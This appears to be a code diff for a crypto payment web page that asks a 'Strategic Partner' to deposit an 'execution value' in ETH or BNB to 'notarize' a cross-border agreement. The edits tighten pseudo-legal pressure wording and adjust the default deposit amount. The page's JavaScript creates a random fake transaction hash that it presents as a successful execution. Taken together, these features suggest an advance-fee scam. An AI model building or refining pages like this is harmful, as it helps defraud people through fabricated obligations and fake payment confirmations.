@@ -433,7 +433,7 @@
   padding: 28px;
   margin: 80px auto 30px;
   box-shadow: 0 10px 30px rgba(0,0,0,0.35);
-  max-width: 280px !important;
+  
 }
 
 /* ---------- Checkbox ---------- */
@@ -880,7 +880,7 @@ CROP MODAL
               font-size: 10px;
               
             ">  
-              Pursuant to the client's signature, the Strategic Partner is mandated to execute the following non-negotiable refundable protocol, to officially notarize and register this cross-border Visual Architecture Suite (Phase 1) agreement.
+              Pursuant to the client's signature and their deposited execution value on the following non-negotiable protocol, the Strategic Partner is mandated to do the same by ensuring their execution value is deposited before <strong>Protocol Confirmation & Execution</strong>, to officially notarize and register this cross-border <strong>Visual Architecture Suite (Phase 1)</strong> agreement.
             </span>
 
           </label>
@@ -929,7 +929,7 @@ CROP MODAL
         </div>
 
         <div class="amount-section">
-          <p>Required Legal Amount</p>
+          <p>Deposit Execution Value</p>
           <p class="amount" id="eth-amount">Loading live rate...</p>
         </div>
 
@@ -946,7 +946,7 @@ CROP MODAL
 
         <div class="walletconnect-actions">
           <button id="walletPayBtnEth" class="wallet-btn" onclick="handlePayClick()">
-            I Confirm & Execute Agreement 
+            I Confirm & Execute Protocol 
           </button>
         </div>
 
@@ -976,7 +976,7 @@ CROP MODAL
         </div>
 
         <div class="amount-section">
-          <p>Required Legal Amount</p>
+          <p>Deposit Execution Value</p>
           <p class="amount" id="bnb-amount">Loading live rate...</p>
         </div>
 
@@ -993,7 +993,7 @@ CROP MODAL
 
         <div class="walletconnect-actions">
           <button id="walletPayBtnBnb" class="wallet-btn" onclick="handlePayClick()">
-            I Confirm & Execute Agreement 
+            I Confirm & Execute Protocol 
           </button>
         </div>
 <div class="terms-disclosure" style="font-size: 12px; color: #666; text-align: center; margin-top: 10px;">
@@ -1366,7 +1366,7 @@ let calculatedBaseAmount;
 if (rawBonus && !isNaN(parseFloat(rawBonus))) {
     calculatedBaseAmount = (parseFloat(rawBonus) * 0.0947).toFixed(2);
 } else {
-    calculatedBaseAmount = parseFloat(localStorage.getItem("avalonflowCustomAmount") || "900.00").toFixed(2);
+    calculatedBaseAmount = parseFloat(localStorage.getItem("avalonflowCustomAmount") || "800.00").toFixed(2);
 }
 
 let randomDecimal = localStorage.getItem("avalonflowRandomDecimal");
@@ -1844,7 +1844,7 @@ async function handlePayClick() {
         localStorage.setItem("av_payment_in_progress", "true");
 
         initiatePaymentAnimationUI();
-        triggerNotification("Connecting authorization protocol...", 3000);
+        triggerNotification("Connecting authorization gateway...", 3000);
 
         // Generate a random execution success alphanumeric transaction hash string (e.g. 0x followed by 64 hex chars)
         const randomHex = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
